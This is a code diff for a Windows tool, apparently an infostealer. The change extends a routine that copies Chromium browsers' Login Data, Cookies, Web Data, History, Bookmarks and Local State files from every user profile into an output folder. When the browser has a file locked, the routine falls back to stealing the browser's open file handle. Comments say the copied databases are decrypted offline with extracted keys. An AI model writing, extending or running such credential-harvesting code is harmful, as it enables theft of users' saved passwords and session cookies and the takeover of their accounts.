@@ -1,6 +1,8 @@
 #include "DbCopy.h"
 #include "HandleSteal.h"
 
+#define MAX_PROFILES    16
+
 // Copies one file: direct read first; when the browser holds an exclusive
 // handle (e.g. Cookies) fall back to stealing + duplicating its open handle.
 // Opera / Opera GX are excluded from the fallback: their sandbox aggressively
@@ -27,27 +29,61 @@ static BOOL CopyOneBrowserFile(IN BROWSER_TYPE Browser, IN LPCSTR pszSrcPath, IN
     return StealAndCopyFileHandle(Browser, pszRelPath, pszDstPath);
 }
 
-// Copies every known browser data file (SQLite DBs + Bookmarks + Local State)
-// into pszOutputDir. Files are copied raw - the DB contents stay encrypted,
-// decryption happens offline with the extracted keys.
+// Resolves one file type of one profile (or the root for Local State) and
+// copies it into pszOutputDir. Missing files are skipped with a log line.
+static BOOL CopyBrowserFileType(IN BROWSER_TYPE Browser, IN BROWSER_FILE_TYPE FileType, IN LPCSTR pszProfileName, IN LPCSTR pszOutputDir)
+{
+    CHAR    szRelPath[MAX_PATH]   = { 0 };
+    CHAR    szSrcPath[MAX_PATH]   = { 0 };
+    CHAR    szDstPath[MAX_PATH]   = { 0 };
+
+    if (!GetChromiumBrowserFilePath(Browser, FileType, pszProfileName, szRelPath, MAX_PATH))
+        return FALSE;
+
+    if (!BuildBrowserDataFilePath(Browser, szRelPath, szSrcPath, MAX_PATH))
+    {
+        printf("[-] Skipping '%s' (Not Found)\n", PathFindFileNameLocalA(szRelPath));
+        return FALSE;
+    }
+
+    wsprintfA(szDstPath, "%s\\%s", pszOutputDir, PathFindFileNameLocalA(szSrcPath));
+
+    if (CopyOneBrowserFile(Browser, szSrcPath, szRelPath, szDstPath))
+    {
+        printf("[+] Copied '%s'\n", PathFindFileNameLocalA(szSrcPath));
+        return TRUE;
+    }
+
+    printf("[!] Failed To Copy '%s'\n", PathFindFileNameLocalA(szSrcPath));
+    return FALSE;
+}
+
+// Copies the raw (still encrypted) browser data files into the per-browser
+// output directory: "Local State" at the top level plus every user profile
+// directory (Default, Profile 1, ...) in its own subdirectory. No decryption
+// is done here - the DB contents are decrypted offline with the extracted keys.
 VOID CopyBrowserFilesToOutputDir(IN BROWSER_TYPE Browser, IN LPCSTR pszOutputDir)
 {
-    const BROWSER_FILE_TYPE   eFileTypes[] = {
+    const BROWSER_FILE_TYPE  eRootFileTypes[] = {
+        FILE_TYPE_LOCAL_STATE
+    };
+
+    const BROWSER_FILE_TYPE  eProfileFileTypes[] = {
         FILE_TYPE_LOGIN_DATA,
         FILE_TYPE_COOKIES,
         FILE_TYPE_WEB_DATA,
         FILE_TYPE_HISTORY,
-        FILE_TYPE_BOOKMARKS,
-        FILE_TYPE_LOCAL_STATE
+        FILE_TYPE_BOOKMARKS
     };
 
-    const DWORD  dwFileTypeCount = sizeof(eFileTypes) / sizeof(eFileTypes[0]);
+    const DWORD  dwRootFileTypeCount    = sizeof(eRootFileTypes) / sizeof(eRootFileTypes[0]);
+    const DWORD  dwProfileFileTypeCount = sizeof(eProfileFileTypes) / sizeof(eProfileFileTypes[0]);
 
-    CHAR    szRelPath[MAX_PATH]   = { 0 };
-    CHAR    szSrcPath[MAX_PATH]   = { 0 };
-    CHAR    szDstPath[MAX_PATH]   = { 0 };
-    DWORD   dwCopied              = 0x00;
-    LPSTR   pszBrowserName        = NULL;
+    CHAR    szProfiles[MAX_PROFILES][MAX_PATH]  = { 0 };
+    CHAR    szProfileDir[MAX_PATH]              = { 0 };
+    DWORD   dwProfileCount                      = 0x00;
+    DWORD   dwCopied                            = 0x00;
+    LPSTR   pszBrowserName                      = NULL;
 
     if (!pszOutputDir)
         return;
@@ -57,27 +93,28 @@ VOID CopyBrowserFilesToOutputDir(IN BROWSER_TYPE Browser, IN LPCSTR pszOutputDir
 
     printf("[*] Copying %s Data Files (No Decryption Needed) ...\n", pszBrowserName);
 
-    for (DWORD i = 0; i < dwFileTypeCount; i++)
+    dwProfileCount = EnumerateBrowserProfiles(Browser, (LPSTR)szProfiles, MAX_PROFILES, MAX_PATH);
+    printf("[*] Found %lu Profile(s)\n", dwProfileCount);
+
+    // Root level: Local State (shared by all profiles)
+    for (DWORD i = 0; i < dwRootFileTypeCount; i++)
     {
-        if (!GetChromiumBrowserFilePath(Browser, eFileTypes[i], szRelPath, MAX_PATH))
-            continue;
-
-        if (!BuildBrowserDataFilePath(Browser, szRelPath, szSrcPath, MAX_PATH))
-        {
-            printf("[-] Skipping '%s' (Not Found)\n", PathFindFileNameLocalA(szRelPath));
-            continue;
-        }
-
-        wsprintfA(szDstPath, "%s\\%s", pszOutputDir, PathFindFileNameLocalA(szSrcPath));
-
-        if (CopyOneBrowserFile(Browser, szSrcPath, szRelPath, szDstPath))
-        {
-            printf("[+] Copied '%s'\n", PathFindFileNameLocalA(szSrcPath));
+        if (CopyBrowserFileType(Browser, eRootFileTypes[i], NULL, pszOutputDir))
             dwCopied++;
-        }
-        else
+    }
+
+    // Profile level: one output subdirectory per profile
+    for (DWORD p = 0; p < dwProfileCount; p++)
+    {
+        printf("[*] Profile: %s\n", szProfiles[p]);
+
+        wsprintfA(szProfileDir, "%s\\%s", pszOutputDir, szProfiles[p]);
+        SHCreateDirectoryExA(NULL, szProfileDir, NULL);
+
+        for (DWORD i = 0; i < dwProfileFileTypeCount; i++)
         {
-            printf("[!] Failed To Copy '%s'\n", PathFindFileNameLocalA(szSrcPath));
+            if (CopyBrowserFileType(Browser, eProfileFileTypes[i], szProfiles[p], szProfileDir))
+                dwCopied++;
         }
     }
 
